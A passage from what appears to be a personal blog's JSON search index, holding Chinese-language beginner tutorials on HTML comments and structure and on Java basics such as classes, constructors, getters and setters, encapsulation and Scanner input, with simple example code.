&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"HTML注释","slug":"html-css00002HTML注释","date":"2020-02-12T14:17:06.000Z","updated":"2020-02-12T14:20:28.931Z","comments":true,"path":"2020/02/12/html-css00002HTML注释/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/12/html-css00002HTML注释/","excerpt":"","text":"HTML注释 有时候需要对程序的说明,这时候就需要用到注释. 注释语法: &lt;!-- 内容 --&gt; 1234567891011&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;!-- 我是注释--&gt;&lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"HTML/CSS基础","slug":"html-css00001HTML-CSS基础","date":"2020-02-12T13:45:47.000Z","updated":"2020-02-12T14:15:33.801Z","comments":true,"path":"2020/02/12/html-css00001HTML-CSS基础/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/12/html-css00001HTML-CSS基础/","excerpt":"","text":"HTML/CSS基础 软件架构 C/S,客户端/服务器端 1.一般我们使用的软件都是C/S架构 2.比如系统中的软件QQ,360,office等等 3.C表示客户端,用户通过客户端来使用软件 4.S表示服务器,服务器负责处理软件的业务逻辑 特点: 1.软件使用前必须得安装 2.软件更新时,服务器和客户端得同时更新 3.C/S架构的软件不能跨平台使用 4.C/S架构的软件客户端和服务器通信采用的是自有协议,相对来说比较安全 B/S,浏览器/服务器 1.B/S本质上也是C/S,只不过B/S架构的软件,使用浏览器作为软件客户端 2.B/S架构软件通过使用浏览器访问网页的形式,来使用软件,比如:京东,淘宝,知乎等等 特点: 1.软件不需要安装,直接使用浏览器访问指定的网址即可 2.软件更新时,客户端不需要更新 3.软件可以跨平台,只要系统中有浏览器,就可以使用. 4.B/S架构的软件,客户端和服务器之间通信采用的是通用的HTTP协议,相对来说不安全,一般采取https协议 W3C标准: 一个网页主要由三部分组成:结构,表现,行为. 结构:对应的是html ,用于描述页面的结构 表现:对应的是CSS, 用于控制页面中元素的样式 行为:对应的是JavaScript , 用于响应用户操作 HTML简介 HTML(Hypertext Markup Language) 超文本标记语言 负责网页的三个要素中的结构 HTML使用标签的形式来标识网页中的不同组成部分 所谓超文本指的是超链接,使用超链接可以让我们从一个页面跳转到另一个页面. 扩展名: .html 标准格式: 12345678910&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"Scanner的概述及使用","slug":"java00041Scanner的概述及使用","date":"2020-02-12T11:46:36.000Z","updated":"2020-02-13T00:32:13.072Z","comments":true,"path":"2020/02/12/java00041Scanner的概述及使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/12/java00041Scanner的概述及使用/","excerpt":"","text":"Scanner类的功能,可以实现键盘输入数据,到程序当中. 包路径:import java.util.Scanner; 使用步骤: 1 . 导包 import 包路径.类名称; 如果需要使用的目标类,和当前类位于同一个包下,则可以省略导包语句不写. 在java.lang包下的内容不需要导包,其他的包都需要import语句; 在集成环境中输入Scanner按下回车会自动进行导包; 2.创建 类名称 对象名 = new 类名称(); 3.使用 对象名.成员方法名() 获取键盘输入的一个int数字,int num = sc.nextInt(); 获取键盘输入的一串字符串: String str = sc.next(); 123456789101112131415161718192021222324252627//导包import java.util.Scanner;public class Main04&#123; public static void main(String[] args) &#123; Dog dog = new Dog(); //创建一个Scanner类 Scanner sc = new Scanner(System.in); System.out.println(\"请输入名字: \"); //输入一个字符串 dog.setName(sc.next()); System.out.println(\"请输入年龄: \"); //输入一个整数 dog.setAge(sc.nextInt()); System.out.println(\"请输入毛色: \"); //输入一个字符串 dog.setColor(sc.next()); System.out.println(\"==============================\"); dog.printAll(); &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public class Dog&#123; private String name;//姓名 private int age;//年龄 private String color;//毛色 public Dog(String name, int age, String color) &#123; this.name = name; this.age = age; this.color = color; &#125; public Dog() &#123; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public String getColor() &#123; return color; &#125; public void setColor(String color) &#123; this.color = color; &#125; public void printAll() &#123; System.out.println(\"名字: \" + name); System.out.println(\"年龄 \" + age); System.out.println(\"毛色: \" + color); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"定义一个标准的类和自动生成构造函数与setter方法/getter方法","slug":"java00040定义一个标准的类和自动生成构造函数与setter方法-getter方法","date":"2020-02-12T00:33:34.000Z","updated":"2020-02-12T00:52:06.153Z","comments":true,"path":"2020/02/12/java00040定义一个标准的类和自动生成构造函数与setter方法-getter方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/12/java00040定义一个标准的类和自动生成构造函数与setter方法-getter方法/","excerpt":"","text":"定义一个标准的类和自动生成构造函数与setter方法/getter方法 一个标准的类 通常有四个部分组成: 所有的成员变量都要使用private关键字修饰 为每一个成员变量编写一对Getter/Setter方法 编写一个无参数的构造方法 编写一个全参数的构造方法 这样标准的类也叫做Java Bean 自动生成构造函数与setter方法/getter方法 通常定义一个标准的类只需要写私有成员变量就行了,其余部分交由编译器去生成. 生成所有私有变量的setter方法/getter 快捷键 : alt + insert 生成所有setter方法/getter方法 生成空构造函数 生成全参造函数 12345678910111213141516171819public class Main03&#123; public static void main(String[] args) &#123; //使用默认构造函数 Dog dog1 = new Dog(); dog1.setName(\"bobo\"); dog1.setAge(2); dog1.setColor(\"white\"); System.out.println(\"姓名: \" + dog1.getName() + \" 年龄: \" + dog1.getAge() + \" 毛色: \" + dog1.getColor()); System.out.println(\"====================\"); //使用全参构造函数 Dog dog2 = new Dog(\"copi\",1,\"blackAndYellow\"); //使用getter方法 System.out.println(\"姓名: \" + dog2.getName() + \" 年龄: \" + dog2.getAge() + \" 毛色: \" + dog2.getColor()); //使用setter方法 dog2.setAge(2); System.out.println(\"姓名: \" + dog2.getName() + \" 年龄: \" + dog2.getAge() + \" 毛色: \" + dog2.getColor()); &#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142public class Dog&#123; private String name;//姓名 private int age;//年龄 public Dog(String name, int age, String color) &#123; this.name = name; this.age = age; this.color = color; &#125; public Dog() &#123; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public String getColor() &#123; return color; &#125; public void setColor(String color) &#123; this.color = color; &#125; private String color;//毛色&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"构造方法","slug":"java00039构造方法","date":"2020-02-12T00:16:02.000Z","updated":"2020-02-12T00:31:58.939Z","comments":true,"path":"2020/02/12/java00039构造方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/12/java00039构造方法/","excerpt":"","text":"构造方法 构造方法是专门用来创建对象的方法,当我们通过关键字new来创建对象时,其实就是在调用构造方法. 构造方法的定义格式: public 类名称( [参数类型 参数名称 , ........] ){ 方法体 } 注意事项: 构造方法的名称必须和所在的类名称完全一样,就连大小写也要一样 构造方法不要写返回值类型,连void都不用写 构造方法不能return一个具体的返回值 如果没有编写如何构造方法,那么编译器将会默认定义一个空构造方法: public 类名 (){}; 一旦编写了至少一个构造方法,那么编译器将不再提供默认的构造方法. 构造方法也是可以重载的. 重载:方法名相同,参数列表不同; 12345678910111213141516public class Main02&#123; public static void main(String[] args) &#123; //默认构造函数 Student student1 = new Student(); //全参构造函数 Student student2 = new Student(\"赵敏\",20); System.out.println(\"姓名: \" + student2.getName() + \"年龄: \" + student2.getAge()); //修改年龄 student2.setAge(21); System.out.println(\"姓名: \" + student2.getName() + \"年龄: \" + student2.getAge()); &#125;&#125; 12345678910111213141516171819202122232425262728293031323334public class Student&#123; //私有成员变量 private String name; private int age; //无参构造方法 Student()&#123; System.out.println(\"无参构造方法被调用\"); &#125;; //全参构造方法 Student(String name,int age)&#123; this.name = name; this.age = age; &#125; //设置name public void setName(String name)&#123; this.name = name; &#125; //获取name public String getName()&#123; return this.name; &#125; //设置age public void setAge(int age) &#123; this.age = age; &#125; //获取age public int getAge()&#123; return this.age; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"this关键字","slug":"java00038this关键字","date":"2020-02-12T00:09:38.000Z","updated":"2020-02-12T00:14:15.293Z","comments":true,"path":"2020/02/12/java00038this关键字/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/12/java00038this关键字/","excerpt":"","text":"this关键字 当方法的局部变量和类的成员变量重名时,工具&quot;就近原则&quot;,优先使用局部变量. 如果需要访问本类的当中的成员变量,需要使用格式: this.变量名 通过谁调用的方法,谁就是this. 12345678public class Main01&#123; public static void main(String[] args) &#123; Person person = new Person(); person.name = \"王思聪\"; person.printWho(\"王健林\"); &#125;&#125; 123456789public class Person&#123; public String name; public void printWho(String name) &#123; //局部变量name和成员变量name重名,所以用this区分 System.out.println(\"你好,我是\" + name + \"\\n你好,我是\" + this.name); // \\n是换行符 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"类方法中的boolean类型的get方法规则","slug":"java00037类方法中的boolean类型的get方法规则","date":"2020-02-11T22:48:52.000Z","updated":"2020-02-11T22:58:19.310Z","comments":true,"path":"2020/02/12/java00037类方法中的boolean类型的get方法规则/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/12/java00037类方法中的boolean类型的get方法规则/","excerpt":"","text":"类方法中的boolean类型的get方法规则 如果类中boolean类型的成员变量是private的,写get方法时的格式一定要是: 以is开头,后面紧跟着变量名,变量名首字符一定要大写 public boolean isXxxx() { return (boolean类型变量); } 如果是``boolean类型的成员变量是private,写set`方法时,按普通写法: public void setXxxx( boolean m_Xxxx) { Xxxx = m_Xxxx; } 1234567891011121314public class Main02&#123; public static void main(String[] args) &#123; Student student = new Student(); student.setName(\"小昭\"); //设置姓名 student.setAge(18);//设置年龄 student.setMale(false);//设置性别 System.out.println(student.getName());//获取姓名 System.out.println(student.getAge());//获取年龄 System.out.println(\"是否是男的: \" + student.isMale());//获取性别 &#125;&#125; 12345678910111213141516171819202122232425262728public class Student&#123; private String name;//学生姓名 private int age;//学生年龄 private boolean male;//学生性别,是否是男的 public String getName()&#123; return name; &#125; public int getAge()&#123; return age; &#125; public boolean isMale()&#123; return male; &#125; public void setName(String m_name)&#123; name = m_name; &#125; public void setAge(int m_age) &#123; age = m_age; &#125; public void setMale(boolean m_setMale) &#123; male = m_setMale; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"private关键字的作用及使用","slug":"java00036private关键字的作用及使用","date":"2020-02-11T10:51:53.000Z","updated":"2020-02-11T23:08:04.415Z","comments":true,"path":"2020/02/11/java00036private关键字的作用及使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/11/java00036private关键字的作用及使用/","excerpt":"","text":"private关键字的作用及使用 问题描述:定义Person的年龄时,无法阻止不合理的数值被赋值进来 解决方案:用private关键字将需要保护的成员变量进行修饰. private 数据类型 变量名 但是!超出了本类范围之外就不能再直接访问了. private成员变量的获取和设置方法规范格式: 获取:getXxxx开头,小驼峰式法,Xxxx代表私有的成员变量名 设置:setXxxx开头,小驼峰式法,Xxxx代表私有的成员变量名 public void setXxxx(int a) { ​ xxxx = a; } public int getXxxx() { return xxxx; } 1234567891011public class Main01&#123; public static void main(String[] args) &#123; Person person = new Person(); person.name = \"张无忌\"; person.setAge(18); person.setHeight(179); person.setSex(\"男\"); person.showPersonAll(); &#125;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364package xiaochenyan.top.person;public class Person&#123; String name; private int age; //私有成员变量 private int height; //私有成员变量 private String sex; //私有成员变量 //用于设置age数据 public void setAge(int m_age) &#123; if(m_age &lt; 0) &#123; System.out.println(\"数据异常\"); return; &#125; age = m_age; &#125; //用于设置height数据 public void setHeight(int m_height) &#123; if(m_height &lt; 0) &#123; System.out.println(\"数据异常\"); return; &#125; height = m_height; &#125; //用于设置sex数据 public void setSex(String m_sex) &#123; sex = m_sex; &#125; //用于获取name数据 public String getName() &#123; return name; &#125; //用于获取sex数据 public String getSex() &#123; return sex; &#125; //用于获取age数据 public int getAge()&#123; return age; &#125; //用于获取height数据 public int getHeight() &#123; return height; &#125; //显示所有的成员变量 public void showPersonAll() &#123; System.out.println(name); System.out.println(age); System.out.println(height); System.out.println(sex); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"面向对象的三大特征","slug":"java00035面向对象的三大特征","date":"2020-02-11T10:23:40.000Z","updated":"2020-02-11T10:32:58.359Z","comments":true,"path":"2020/02/11/java00035面向对象的三大特征/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/11/java00035面向对象的三大特征/","excerpt":"","text":"面向对象的三大特征 面向对象的三大特征:封装,继承,多态 封装性在java当中体现: 1.方法就是一种封装 2.关键字private也是一种封装 封装就是将一些细节信息隐藏起来,对外界不可见. 12345678910public class Main4 &#123; public static void main(String[] args) &#123; Phone one = new Phone(); one.brand = \"苹果\"; one.price = 8388.0; one.color = \"黑色\"; one.printAll();//封装性,不用了解方法是怎么实现显示成员变量的,只需要知道怎么调用就行了. &#125;&#125; 12345678910111213public class Phone &#123; String brand;//产品 double price;//价格 String color;//颜色 public void printAll() &#123; System.out.println(brand); System.out.println(price); System.out.println(color); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"局部变量和成员变量的区别","slug":"java00034局部变量和成员变量的区别","date":"2020-02-11T02:59:03.000Z","updated":"2020-02-11T03:15:47.154Z","comments":true,"path":"2020/02/11/java00034局部变量和成员变量的区别/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/11/java00034局部变量和成员变量的区别/","excerpt":"","text":"局部变量和成员变量的区别 1.定义的位置不一样 局部变量:在方法内部定义 成员变量:在方法外部定义,直接写在类当中 2.作用范围不一样 局部变量:只有方法当中才可以使用,出了方法就不能再用 成员变量:整个类全部都可以通用. 3.默认值不一样 局部变量:没有默认值,如果想使用,必须手动进行赋值 成员变量:如果没有赋值,会有默认值,规则和数组一样 4.内存的位置不一样 局部变量:位于栈内存 成员变量:位于堆区内存 5.生命周期不一样 局部变量:随着方法进栈而诞生,随着方法出栈而消失 成员变量:随着对象创建而诞生,随着对象被垃圾回收而消失 1234567891011public class Main3 &#123; public static void main(String[] args) &#123; Phone one = new Phone();//在堆区诞生 int a;//在栈区诞生 System.out.println(one.color);//默认值为null //System.out.println(a);//int a没有初始化,所以不能被使用. &#125;&#125; 123456789101112131415//类的定义public class Phone &#123; //成员变量在整个类作用域有效 String brand;//产品 double price;//价格 String color;//颜色 public void printAll() &#123; System.out.println(brand); System.out.println(price); System.out.println(color); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"使用对象类型作为方法的返回值","slug":"java00033使用对象类型作为方法的返回值","date":"2020-02-11T02:10:46.000Z","updated":"2020-02-11T02:20:10.670Z","comments":true,"path":"2020/02/11/java00033使用对象类型作为方法的返回值/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/11/java00033使用对象类型作为方法的返回值/","excerpt":"","text":"使用对象类型作为方法的返回值 当使用一个对象类型作为方法的返回值时:返回值其实就是对象的地址. 1234567891011121314151617public class Main2 &#123; public static void main(String[] args) &#123; Phone two = getPhone(); System.out.println(two.brand);//苹果 System.out.println(two.price);//8388.0 System.out.println(two.color);//玫瑰金 &#125; public static Phone getPhone()&#123; Phone one = new Phone(); one.brand = \"苹果\"; one.price = 8388.0; one.color = \"玫瑰金\"; return one; &#125;&#125; 1234567891011121314public class Phone &#123; String brand;//产品 double price;//价格 String color;//颜色 public void printAll() &#123; System.out.println(brand); System.out.println(price); System.out.println(color); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"两个对象指向同一个引用的内存图","slug":"java00031两个对象指向同一个引用的内存图","date":"2020-02-11T01:50:54.000Z","updated":"2020-02-11T01:56:52.138Z","comments":true,"path":"2020/02/11/java00031两个对象指向同一个引用的内存图/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/11/java00031两个对象指向同一个引用的内存图/","excerpt":"","text":"两个对象指向同一个引用的内存图 其中one对象和two对象都指向同一个堆 只要其中一个对象发生改变,另一个对象也会发生改变","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"使用对象类型作为方法的参数","slug":"java00032使用对象类型作为方法的参数","date":"2020-02-11T01:48:44.000Z","updated":"2020-02-11T02:12:25.873Z","comments":true,"path":"2020/02/11/java00032使用对象类型作为方法的参数/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/11/java00032使用对象类型作为方法的参数/","excerpt":"","text":"使用对象类型作为方法的参数 当一个对象作为参数,传递到方法当中时,实际上传进去的是对象的地址值 1234567891011121314151617public class Main &#123; public static void main(String[] args) &#123; Phone one = new Phone(); one.brand = \"苹果\"; one.price = 8388.0; one.color = \"黑色\"; method(one); &#125; public static void method(Phone param)&#123; System.out.println(param.brand);//苹果 System.out.println(param.price);//8388.0 System.out.println(param.color);//黑色 &#125;&#125; 123456789101112131415//类的定义public class Phone &#123; String brand; double price; String color; public void printAll() &#123; System.out.println(brand); System.out.println(price); System.out.println(color); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java两个对象使用同一个方的法内存","slug":"java00030两个对象使用同一个方法的内存","date":"2020-02-09T10:44:09.000Z","updated":"2020-02-09T11:03:45.735Z","comments":true,"path":"2020/02/09/java00030两个对象使用同一个方法的内存/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/09/java00030两个对象使用同一个方法的内存/","excerpt":"","text":"java两个对象使用同一个方的法内存 1.创建one对象时会创建一个堆,one指向堆地址 2.修改one.brand成员变量时,先从one找到堆地址,接着再从堆中找到brand变量,然后修改brand的值为&quot;苹果&quot; 3.修改one.price成员变量时,先从one找到堆地址,接着再从堆中找到price变量,然后修改price的值为8388.0 4.修改one.color成员变量时,先从one找到堆地址,接着再从堆中找到color变量,然后修改color的值为黑色 5.调用one.call()方法,先从one找到堆地址,接着从堆中找到成员方法所在方法区中的地址,然后在从方法区中找到one.call()方法,接着将one.call()方法压入栈. 1).初始化who参数的值为&quot;乔布斯&quot; 2).输出&quot;给xxx打电话&quot; 3).将one.call()方法退栈 4).返回到调用one.call()方法中的下一条语句 6.调用one.sendMessage()方法,先从one找到堆地址,接着从堆中找到成员方法所在方法区中的地址,然后在从方法区中找到one.sendMessage()方法,接着将one.sendMessage()方法压入栈. 1).输出&quot;群发短信&quot; 2).将one.sendMessage()方法退栈 3).返回到调用one.sendMessage()方法中的下一条语句 7.创建two对象时会创建一个堆,two指向堆地址 8.修改two.brand成员变量时,先从two找到堆地址,接着再从堆中找到brand变量,然后修改brand的值为&quot;三星&quot; 9.修改two.price成员变量时,先从two找到堆地址,接着再从堆中找到price变量,然后修改price的值为5999.0 10.修改two.color成员变量时,先从two找到堆地址,接着再从堆中找到color变量,然后修改color的值为蓝色 11.调用two.call()方法,先从two找到堆地址,接着从堆中找到成员方法所在方法区中的地址,然后在从方法区中找到two.call()方法,接着将two.call()方法压入栈. 1).初始化who参数的值为&quot;欧巴&quot; 2).输出&quot;给欧巴打电话&quot; 3).将two.call()方法退栈 4).返回到调用two.call()方法中的下一条语句 12.调用two.sendMessage()方法,先从two找到堆地址,接着从堆中找到成员方法所在方法区中的地址,然后在从方法区中找到two.sendMessage()方法,接着将two.sendMessage()方法压入栈. 1).输出&quot;群发短信&quot; 2).将two.sendMessage()方法退栈 3).返回到调用two.sendMessage()方法中的下一条语句 13.main方法结束,将main方法退栈; one对象方法和two对象方法是指向同一个方法内存的","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"一个对象的内存图","slug":"java00029一个对象的内存图","date":"2020-02-09T07:40:56.000Z","updated":"2020-02-09T10:51:42.281Z","comments":true,"path":"2020/02/09/java00029一个对象的内存图/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/09/java00029一个对象的内存图/","excerpt":"","text":"一个对象的内存图 1.创建one对象时会创建一个堆,one指向堆地址 2.修改one.brand成员变量时,先从one找到堆地址,接着再从堆中找到brand变量,然后修改brand的值为&quot;苹果&quot; 3.修改one.price成员变量时,先从one找到堆地址,接着再从堆中找到price变量,然后修改price的值为8388.0 4.修改one.color成员变量时,先从one找到堆地址,接着再从堆中找到color变量,然后修改color的值为黑色 5.调用one.call()方法,先从one找到堆地址,接着从堆中找到成员方法所在方法区中的地址,然后在从方法区中找到one.call()方法,接着将one.call()方法压入栈. 1).初始化who参数的值为&quot;乔布斯&quot; 2).输出&quot;给xxx打电话&quot; 3).将one.call()方法退栈 4).返回到调用one.call()方法中的下一条语句 6.调用one.sendMessage()方法,先从one找到堆地址,接着从堆中找到成员方法所在方法区中的地址,然后在从方法区中找到one.sendMessage()方法,接着将one.sendMessage()方法压入栈. 1).输出&quot;群发短信&quot; 2).将one.sendMessage()方法退栈 3).返回到调用one.sendMessage()方法中的下一条语句 7.main方法结束,将main方法退栈;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"类的定义","slug":"java00027类的定义","date":"2020-02-09T06:37:24.000Z","updated":"2020-02-09T06:44:49.507Z","comments":true,"path":"2020/02/09/java00027类的定义/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/09/java00027类的定义/","excerpt":"","text":"类的定义 定义一个类,有两个组成部分: 成员属性: 事物的状态信息. 成员行为: 事物的行为. 注意事项: 1.成员变量是直接定义在类当中的,在方法外面. 2.成员方法不要写static关键字. 1234567891011121314151617181920212223242526272829303132333435363738394041424344package xiaochenyan.top.banji;/*定义一个类,用模拟\"学生\"事物.其中有两个组成部分:属性(是什么): 姓名 年龄行为(能做什么): 吃饭 睡觉 学习对应到Java的类当中:成员变量(属性): String name; int age;成员方法(行为): public void eat()&#123;&#125;; //吃饭 public void sleep()&#123;&#125;; //睡觉 public void study()&#123;&#125;; //学习*/public class Student01 &#123; //属性(成员变量) String name; int age; //行为(成员方法) public void eat()&#123; System.out.println(\"吃饭饭\"); &#125; public void sleep()&#123; System.out.println(\"睡觉觉\"); &#125; public void study()&#123; System.out.println(\"学习!\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"对象的创建及其使用","slug":"java00028对象的创建及其使用","date":"2020-02-09T06:28:42.000Z","updated":"2020-02-09T06:37:01.158Z","comments":true,"path":"2020/02/09/java00028对象的创建及其使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/09/java00028对象的创建及其使用/","excerpt":"","text":"对象的创建及其使用 1.导包: 也就是指出需要使用的类,在什么位置. import 包名称.类名称; import xiaochenyan.top.banji; 对于和当前类属于同一个包的情况,可以省略导包语句不写. 2.创建,格式 类名称 对象名 = new 类名称(); Student01 std = new Student01(); 3.使用,分为两种情况 使用成员变量,对象名.成员变量 使用成员方法,对象名.成员方法名(参数) (也就是,想用谁,就用对象名点谁) 123456789101112131415161718192021222324252627282930313233343536373839404142434445package xiaochenyan.top.banji;//导包格式import xiaochenyan.top.banji.Student01;/*1.导包: 也就是指出需要使用的类,在什么位置.import 包名称.类名称;import xiaochenyan.top.banji;对于和当前类属于同一个包的情况,可以省略导包语句不写.2.创建,格式类名称 对象名 = new 类名称();Student01 std = new Student01();3.使用,分为两种情况使用成员变量,对象名.成员变量使用成员方法,对象名.成员方法名(参数)(也就是,想用谁,就用对象名点谁) */public class test001 &#123; public static void main(String[] args) &#123; //创建对象格式 Student01 std = new Student01(); //使用成员变量格式 System.out.println(std.age); System.out.println(std.name); //使用成员方法格式 std.eat(); std.sleep(); std.study(); System.out.println(\"===========================\"); std.name = \"金毛狮王\"; std.age = 52; //使用成员变量格式 System.out.println(std.age); System.out.println(std.name); //使用成员方法格式 std.eat(); std.sleep(); std.study(); System.out.println(\"===========================\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"类的定义","slug":"java00026类的定义","date":"2020-02-09T05:52:12.000Z","updated":"2020-02-09T06:04:59.484Z","comments":true,"path":"2020/02/09/java00026类的定义/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/09/java00026类的定义/","excerpt":"","text":"类的定义 事物与类的对比 现实世界的一类事物: 属性: 事物的状态信息 行为: 事物能够做什么 java中用class描述事物也是如此: 成员变量: 对应事物的属性 成员方法: 对应事物的行为 类的定义格式 1234public class ClassName&#123; //成员变量 //成员方法&#125; 定义类: 就是定义类的成员,包括成员变量和成员方法. 成员变量: 和以前定义变量几乎一样的,只不过位置发生了改变.在类中,在方法外. 成员方法: 和以前定义方法几乎是一样的.只不过把static去掉.","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"类和对象的关系","slug":"java00025类和对象的关系","date":"2020-02-09T05:47:30.000Z","updated":"2020-02-09T05:50:15.205Z","comments":true,"path":"2020/02/09/java00025类和对象的关系/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/09/java00025类和对象的关系/","excerpt":"","text":"类和对象","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"面向对象思想的举例","slug":"java00024面向对象思想的举例","date":"2020-02-09T05:44:02.000Z","updated":"2020-02-09T05:46:38.927Z","comments":true,"path":"2020/02/09/java00024面向对象思想的举例/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/09/java00024面向对象思想的举例/","excerpt":"","text":"举例","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"面向对象思想的概述","slug":"java00023面向对象思想的概述","date":"2020-02-09T05:29:23.000Z","updated":"2020-02-09T05:41:57.338Z","comments":true,"path":"2020/02/09/java00023面向对象思想的概述/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/09/java00023面向对象思想的概述/","excerpt":"","text":"面向过程: 当需要实现一个功能的时候,每一个具体的步骤都要亲力亲为,详细处理每一个细节. 面向对象: 当需要实现一个功能的时候,不关心具体的步骤,而是找一个已经具有该功能的人,来帮我做事儿. 12345678910111213141516171819202122232425262728package xiaochenyan.top.banji;import java.util.Arrays;public class Student &#123; public static void main(String[] args) &#123; int[] array = &#123;1,23,4,15,51,2,52,23&#125;; //要求打印格式为[123,,123,41,123,] //使用面向过程,每一个步骤细节都要亲力亲为 System.out.print(\"[\"); for(int i = 0;i &lt; array.length;i++) &#123; if(i == array.length - 1) &#123; System.out.println(array[i] + \"]\"); &#125;else&#123; System.out.print(array[i] + \", \"); &#125; &#125; System.out.println(\"======================\"); //使用面向对象 //找一个JDK给我们提供好的Arrays类 //其中有一个toString方法,直接就能把数组变成想要的格式字符串 System.out.println(Arrays.toString(array)); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"数组作为方法的返回值返回","slug":"java00022数组作为方法返回值返回","date":"2020-02-08T10:20:21.000Z","updated":"2020-02-09T04:59:23.096Z","comments":true,"path":"2020/02/08/java00022数组作为方法返回值返回/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00022数组作为方法返回值返回/","excerpt":"","text":"一个方法可以有1个或多个参数;但是只能有0个或1个返回值,不能有个多返回值. 如果希望一个方法当中产生了多个结果数据进行返回 , 怎么办 ? 解决方案:使用一个数组作为返回值类型即可. 任何数据类型都能作为方法的参数类型,或者返回值类型. 数组作为方法的参数,传递进去的其实是数组的地址值 数组作为方法的返回值,返回的其实是数组的地址值 1234567891011121314151617181920public class test020 &#123; public static void main(String[] args) &#123; int[] array = sumAndPingJunShu(1,2,3); for (int i : array) &#123; System.out.println(i); &#125; &#125; public static int[] sumAndPingJunShu(int a,int b,int c) &#123; int sum = a + b + c; int pjs = (a + b + c) / 3; int cj = a * b * c; int[] array = &#123;sum,pjs,cj&#125;; return array; 